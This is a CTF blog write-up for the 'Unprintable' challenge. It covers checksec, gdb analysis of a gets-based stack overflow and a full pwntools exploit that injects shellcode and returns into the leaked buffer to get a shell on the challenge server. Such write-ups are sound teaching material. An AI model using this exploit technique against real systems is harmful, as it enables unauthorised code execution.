---
title: "OSU League 2020/2021 - Unprintable Writeup"
date: 2020-10-30
draft: false
description: ""
tags: ["ctf"]
---
## Writeup
We are given a binary, so let's see what it does:
```
I found some empty room in the RAM on this system, and prepared some especially for you!
But I'm worried you might put something evil in it, so I'm not going to print it out
Here's your special RAM, happy birthday!: 0x7ffd617472f0
What are you going to do with it?
I wanna consume it
I hope you enjoyed your memory!
```

Hmm, looks like we are given a memory address along with a place to put some text.  Usually with challenges like these, the memory address given is the address of the buffer, we can verify this in a bit, but for now lets look at what securities the binary has using `pwn checksec unprintable`:

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Hmm, NX is disabled, meaning the stack is excecutable.  That means we can probably excecute shellcode on the stack.  Now let's open up the binary in gdb and see what's going on.

Running `info functions`, we get a list of the functions used in the program.  Its seems like the `input` function is the one we are looking for, so let's disassemble that.

```
gdb-peda$ disass input
Dump of assembler code for function input:
   0x00000000000006ca <+0>:	push   rbp
   0x00000000000006cb <+1>:	mov    rbp,rsp
   0x00000000000006ce <+4>:	sub    rsp,0x70
   0x00000000000006d2 <+8>:	lea    rax,[rbp-0x70]
   0x00000000000006d6 <+12>:	mov    rsi,rax
   0x00000000000006d9 <+15>:	lea    rdi,[rip+0xf8]        # 0x7d8
   0x00000000000006e0 <+22>:	mov    eax,0x0
   0x00000000000006e5 <+27>:	call   0x590 <printf@plt>
   0x00000000000006ea <+32>:	lea    rdi,[rip+0x117]        # 0x808
   0x00000000000006f1 <+39>:	call   0x580 <puts@plt>
   0x00000000000006f6 <+44>:	lea    rax,[rbp-0x70]
   0x00000000000006fa <+48>:	mov    rdi,rax
   0x00000000000006fd <+51>:	mov    eax,0x0
   0x0000000000000702 <+56>:	call   0x5a0 <gets@plt>
   0x0000000000000707 <+61>:	nop
   0x0000000000000708 <+62>:	leave  
   0x0000000000000709 <+63>:	ret    
End of assembler dump.
```
We can set a breakpoint right before the leave instruction to get a view of the stack right before returning.

```
gdb-peda$ break *input+61
Breakpoint 1 at 0x707
gdb-peda$ r
Starting program: /home/perchik/CTF/osuleague/week3/unprintable
I found some empty room in the RAM on this system, and prepared some especially for you!
But I'm worried you might put something evil in it, so I'm not going to print it out
Here's your special RAM, happy birthday!: 0x7fffffffde60
What are you going to do with it?
gimme cookies

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffde60 ("gimme cookies")
RBX: 0x0
RCX: 0x7ffff7dcfa00 --> 0xfbad2288
RDX: 0x7ffff7dd18d0 --> 0x0
RSI: 0x6f6f6320656d6d69 ('imme coo')
RDI: 0x7fffffffde61 ("imme cookies")
RBP: 0x7fffffffded0 --> 0x7fffffffdee0 --> 0x555555554750 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffde60 ("gimme cookies")
RIP: 0x555555554707 (<input+61>:	nop)
R8 : 0x55555575667e --> 0x0
R9 : 0x7ffff7fe04c0 (0x00007ffff7fe04c0)
R10: 0x555555756010 --> 0x0
R11: 0x246
R12: 0x5555555545c0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdfc0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
```

Sweet!  Looks like the address given is indeed the start of our buffer. Now to figure out how big that buffer is.  We can run it again, and this time lets look at the stack frame and calculate the offset of the saved rip and the address leak we were given.

```
Saved registers:
  rbp at 0x7fffffffded0, rip at 0x7fffffffded8
```

Subracting these two we end up getting a buffer that is 120 bytes.  So now we have everything we need to craft our exploit!

I used pwntools to craft the exploit, as it streamlines many things such as creating shellcode, connecting to a remote binary, etc.  

```python
from pwn import *
io = remote('ctf.ropcity.com', 31337)
#io = process("./unprintable")
#io = gdb.debug("./unprintable")
context.update(arch='amd64', os='linux')

io.recvuntil("birthday!: ")

address = int(io.recvline()[2:-1], 16)
shell = shellcraft.sh()
shellcode = asm(shell)
payload = shellcode.ljust(120, b'A')
payload += p64(address)

io.recvuntil("What are you going to do with it?")
io.sendline(payload)

io.interactive()
```

And running it we get a shell!!!

```
[+] Opening connection to ctf.ropcity.com on port 31337: Done
[*] Switching to interactive mode
$ cat flag
osu{i_c0uldnt_pr1nt_th4t_1f_I_tRi3ed!!!1!}
```

Woot! Learned a lot about getting shellcode working in pwntool, as well as using ljust to fill the buffer.  Super fun challenge!
